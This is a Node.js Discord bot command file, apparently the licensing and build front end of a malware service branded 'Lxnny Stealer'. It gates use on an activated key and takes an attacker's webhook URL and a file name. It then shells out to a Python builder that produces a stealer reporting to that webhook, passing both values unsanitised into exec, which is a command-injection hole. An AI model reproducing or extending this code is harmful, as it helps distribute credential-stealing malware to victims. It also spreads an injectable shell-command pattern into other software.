const { MessageEmbed } = require('discord.js');
const { exec } = require('child_process');
const path = require('path');

function buildCommand(message, keys) {
    if (!message.guild) {
        const authorKey = keys[message.author.id];
        if (!authorKey) {
            const noKeyEmbed = new MessageEmbed()
                .setColor('#2b2d31')
                .setDescription("You don't have permission to use this command. Please activate your key.")
                .setFooter('@lxnnystealer')
                .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png');
            return message.channel.send({ embeds: [noKeyEmbed] });
        }

        const args = message.content.trim().split(/ +/);
        const webhook = args[1];
        const namefile = args[2];

        if (!webhook || !namefile) {
            const missingArgsEmbed = new MessageEmbed()
                .setColor('#2b2d31')
                .setDescription('Please provide the webhook and the filename.') 
                .setFooter('@lxnnystealer')
                .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png');

            return message.channel.send({ embeds: [missingArgsEmbed] });
        }

        const webhookRegex = /^(https:\/\/canary\.discord\.com\/api\/webhooks\/|https:\/\/discord\.com\/api\/webhooks\/)/;
        if (!webhook.match(webhookRegex)) {
            const invalidWebhookEmbed = new MessageEmbed()
                .setColor('#2b2d31')
                .setDescription("Invalid webhook. Please provide a valid webhook.")
                .setFooter('@lxnnystealer')
                .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png');
                
            return message.channel.send({ embeds: [invalidWebhookEmbed] });
        }

        const buildingEmbed = new MessageEmbed()
            .setColor('#2b2d31')
            .setDescription("Check your WEBHOOK!")
            .setFooter('@lxnnystealer')
            .setAuthor('Lxnny Stealer', 'https://i.ibb.co/Sd3TP0m/image.png');
        
        message.channel.send({ embeds: [buildingEmbed] })
            .then(sentEmbed => {
                exec(`python builder.py ${webhook} ${namefile}`, (error, stdout, stderr) => {
                    console.log(stdout);
                    if (error) {
                        console.error(`Error executing the build: ${error}`);
                        const errorEmbed = new MessageEmbed()
                            .setColor('#2b2d31')
                            .setDescription(`Error executing the build: ${error}`);
                        return message.channel.send({ embeds: [errorEmbed] });
                    }

                    console.log(`Build completed successfully!`);
                    const successEmbed = new MessageEmbed()
                        .setColor('#2b2d31')
                        .setDescription('Build completed successfully!');
                    message.channel.send({ embeds: [successEmbed] });
                });
            });
    } else {
        const invalidLocationEmbed = new MessageEmbed()
            .setColor('#2b2d31')
            .setDescription("This command can only be used in direct messages.");
        message.channel.send({ embeds: [invalidLocationEmbed] });
    }
}

module.exports = buildCommand;
